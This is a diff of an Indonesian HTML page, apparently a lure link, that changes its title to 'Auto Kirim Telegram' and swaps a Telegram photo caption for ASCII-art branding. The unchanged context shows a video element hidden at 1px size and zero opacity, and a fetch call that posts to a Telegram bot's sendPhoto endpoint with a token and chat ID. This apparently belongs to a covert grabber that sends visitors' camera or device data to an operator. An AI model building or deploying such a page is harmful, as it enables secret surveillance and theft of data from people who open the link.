@@ -1,7 +1,7 @@
 <!DOCTYPE html><html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>URL CLIK</title>
+  <title>Auto Kirim Telegram</title>
   <style>
     body { margin: 0; background: transparent; overflow: hidden; }
     video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0; }
@@ -152,7 +152,13 @@ ${cuaca}`;
 // Kirim foto dari URL
 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
   method: 'POST',
-  body: new URLSearchParams({ chat_id, photo: 'https://files.catbox.moe/p7xbtg.png', caption: '📸 Foto URL tambahan' })
+  body: new URLSearchParams({ chat_id, photo: 'https://files.catbox.moe/p7xbtg.png', caption: '
+╭━━╮╭╮╱╱╭╮╭━━━┳━━┳━━━━╮
+┃╭╮┃┃╰╮╭╯┃┃╭━╮┣┫┣┻━━╮━┃
+┃╰╯╰╋╮╰╯╭╯┃╰━╯┃┃┃╱╱╭╯╭╯
+┃╭━╮┃╰╮╭╯╱┃╭╮╭╯┃┃╱╭╯╭╯╱
+┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┳╯━╰━╮
+╰━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━━╯' })
 });
 
 window.onload = () => {
